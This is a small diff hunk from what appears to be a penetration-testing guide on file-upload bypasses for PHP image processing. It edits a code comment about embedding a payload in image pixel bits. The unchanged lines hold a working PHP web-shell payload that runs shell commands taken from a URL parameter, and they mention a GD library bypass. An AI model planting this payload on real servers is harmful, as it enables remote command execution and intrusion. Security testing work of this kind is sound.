@@ -10,7 +10,7 @@ If the server uses GD/Imagick to resize/re-encode uploads, simple appended paylo
 from PIL import Image
 img = Image.open('clean.png')
 payload = b'<?php system($_GET["c"]); ?>'
-# Embed in LSB - requires custom PHP LFI/include gadget to execute, rarely直接 useful for upload RCE
+# Embed in LSB - requires a custom PHP LFI/include gadget to execute; rarely directly useful for upload RCE
 ```
 
 ### GD Library Specific Bypass (older PHP GD versions)
